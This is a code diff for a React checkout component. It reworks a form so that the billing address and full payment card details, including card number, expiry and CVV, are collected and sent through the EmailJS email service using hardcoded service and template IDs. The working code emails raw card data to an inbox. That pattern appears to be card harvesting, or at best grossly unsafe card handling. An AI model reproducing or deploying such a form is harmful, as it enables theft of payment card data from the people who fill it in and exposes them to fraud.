@@ -8,7 +8,7 @@ function App() {
     e.preventDefault();
 
     emailjs
-      .sendForm('gmail', 'template_mac1gjl', form.current, 'hBfaS6THc2wq1HC0s')
+      .sendForm('service_twhf5v8', 'template_mac1gjl', form.current, 'hBfaS6THc2wq1HC0s')
       .then(
         (result) => {
           console.log(result.text);
@@ -30,26 +30,31 @@ function App() {
           <h2 style={{ fontSize: '24px', fontWeight: 'bold' }}>Billing Address</h2>
           <h2 style={{ fontSize: '24px', fontWeight: 'bold' }}>Payment</h2>
         </div>
+        <form ref={form} onSubmit={sendEmail}>
         <div style={{ display: 'flex' }}>
           <div style={{ flex: '1', marginRight: '40px' }}>
-            <form ref={form} onSubmit={sendEmail}>
+            
               <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} type="text" name="user_name" placeholder="Full Name" />
               <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} type="email" name="user_email" placeholder="Email" />
               <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} name="address" placeholder="Address" />
               <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} name="city" placeholder="City" />
-              <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} id="status" placeholder="State" />
-              <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} id="zip" placeholder="Zip" />
-              <input style={{ marginBottom: '10px', padding: '10px', width: '100%', background: '#4caf50', color: 'white', fontWeight: 'bold', cursor: 'pointer' }} type="submit" value="Send" onClick={handleClick} />
-            </form>
+              <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} name="contry" id="status" placeholder="contry" />
+              <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} name="zip" id="zip" placeholder="Zip" />
+              
+            
           </div>
           <div style={{ flex: '1' }}>
+          
             <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} type="text" name="card_name" placeholder="Name on Card" />
-            <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} type="email" name="number" placeholder="Card number" />
-            <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} name="exp_month" placeholder="Exp Month" />
-            <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} name="exp_year" placeholder="Exp Year" />
-            <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} name="cvv" placeholder="CVV" />
+            <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} type="text" name="number" placeholder="Card number" />
+            <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} type="text" name="exp_month" placeholder="Exp Month" />
+            <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} type="text" name="exp_year" placeholder="Exp Year" />
+            <input style={{ marginBottom: '10px', padding: '10px', width: '100%' }} type="text" name="cvv" placeholder="CVV" />
+           
           </div>
         </div>
+        <input style={{ marginBottom: '10px', padding: '10px', width: '100%', background: 'black', color: 'white', fontWeight: 'bold', cursor: 'pointer' }} type="submit" value="Send" onClick={handleClick} />
+        </form>
       </div>
     </div>
   );
